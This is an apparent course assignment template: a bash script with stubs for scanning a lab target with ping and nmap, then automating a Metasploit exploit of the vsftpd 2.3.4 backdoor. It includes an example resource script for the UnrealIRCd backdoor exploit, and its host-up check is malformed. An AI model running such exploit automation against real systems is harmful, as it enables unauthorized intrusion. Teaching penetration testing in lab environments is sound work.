#!/bin/bash
: '
# Assignment 5 - In this assignment, you will combining multiple tools to generate a
security html/pdf report of vulnerabilities on a target system.

You will need to follow the supplement guide to configure your environment in order to
complete the assignment.

Good Luck!

EXAMPLE: .\assignment5.sh 10.0.2.4
'

##### Constants #####
# 1. Enter your name for the report and set the TARGET_IP to the "1st" argument
STUDENT_NAME="<YOUR NAME>"
TITLE="Security Report prepared for CSCI 1411 - Spring 2021"
RIGHT_NOW=$(date +"%x %r %Z")
TIME_STAMP="Updated on $RIGHT_NOW by $STUDENT_NAME"
TARGET_IP=#YOUR CODE HERE

##### Functions #####

# Function: target_info
# Purpose: To write out the target's IP Address in HTML
# 2. Add the variable defined for the target IP in the constants section
function target_info()
{
    echo "<h2>Target IP Address</h2>"
    echo "<pre>"
    echo "IP Address: " #YOUR CODE HERE
    echo "</pre>"

}   # end of target_info

# Function: target_ping
# Purpose: To write out the target's ping response in HTML
# 3. Use the ping command to test the target systems network response. You will need 
# to specify a paramater to counts and stops pinging after 4 attempts.
# HINT: You should ping the same machine specified in Question 2.
function target_ping()
{
    echo "<h2>Target Ping Response</h2>"
    echo "<pre>"
    #YOUR CODE HERE

    echo "</pre>"

}   # end of target_ping

# Function: target_os
# Purpose: To write out the target's Operating System in HTML
# 4. Use nmap to identify the Operating System of the target system. You may consider 
# using the pipe operator to grep the nmap results for the OS information line only.
function target_os()
{
    echo "<h2>System Operating System</h2>"
    echo "<pre>"
    #YOUR CODE HERE

    echo "</pre>"

}   # end of target_os



# Function: target_ports_open
# Purpose: To write out the target's open ports in HTML
# 5. Use nmap with a parameter to scan ports with Version detection. You may consider 
# using the pipe operator to grep the nmap results for the lines that contain open ports only.
# https://nmap.org/book/man-version-detection.html
function target_ports_open()
{
    # Runs only if host is up
    up="$(target_ping | grep '4 received')"
    if [ "$up'=='" ]; then
        echo "<h2>Ports open</h2>"
        echo "<pre>"
        # YOUR CODE HERE
        
        echo "</pre>"
    fi

}   # end of target_ports_open

# Function: exploit_vsftpd
# Purpose: This function will use Metasploit to execute an exploit on our target system
# 6. The Metasploit framework allows for scripted attacks via Resource Script
# HINT: https://www.offensive-security.com/metasploit-unleashed/writing-meterpreter-scripts/
: ' Example Resource Script
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 10.0.2.4
exploit -z
exit -y
'
function exploit_vsftpd()
{
    # Build our metasploit attack Resrouce Script
    # Find a vsftpd exploit in the Metasploit library
    # Specify the expoit you want to use on the target system
    # Output the command to create a new resource script file 
    # called vsftpd.rc using either > or >>

    # YOUR CODE HERE

    # Next, append to the resource file vsftpd.rc setting the RHOST
    # to your target IP variable

    # YOUR CODE HERE

    # One of the last calls in the Resource script is to execute the exploit.
    # Append "exploit -z" the -z parameter will execute the exploit in the background

    # YOUR CODE HERE

    # DO NOT MODIFY
    echo "exit -y" >> vsftpd.rc

    # Finally, you are ready to execute the exploit!
    # The resource script (vsftpd.rc) you created above will be used as an argument
    # with the Metasploit console (msfconsole). 
    echo "<h3>Results of Vsftpd exploit attempt on target</h3>"
    echo "<pre>"
    # YOUR CODE HERE
    echo "</pre>"

}   # end of exploit_vsftpd

# Function: target_attack
# Purpose: Check if remote system has the vsftpd 2.3.4 vulnerability
# 7. Search if the vsfpd vulnerability by completing the grep command below
function target_attack_vsftpd()
{  
    echo "<h2>Exploits</h2>"
        if target_ports_open | grep "YOUR CODE HERE"; then
            exploit_vsftpd
        else
            echo "Remote Host does not contain vsftpd vulnerability"
        fi
}   # end of target_attack_vsftpd

# Function: write_html
# Purpose: To write out to generate the full report in HTML
function write_html()
{
cat <<- _EOF_
    <html>
    <head>
        <title>$TITLE</title>
    </head>
    <body>
        <h1>$TITLE</h1>
        <p>$TIME_STAMP</p>
        $(target_info)
        $(target_os)
        $(target_ping)
        $(target_ports_open)
        $(target_attack_vsftpd)
        <h1>END OF REPORT</h1>
    </body>
    </html>
_EOF_
}

##### Main #####
## DO NOT MODIFY ##

if [ $# -eq 0 ]; then
    echo "Please supply target IP address: ./assignment5 10.0.2.4"
    echo "Example: ./assignment5 10.0.2.4"
else
    write_html > SecuirtyReport-$TARGET_IP.html
    wkhtmltopdf SecuirtyReport-$TARGET_IP.html SecuirtyReport-$TARGET_IP.pdf
    firefox SecuirtyReport-$TARGET_IP.pdf &
    exit
fi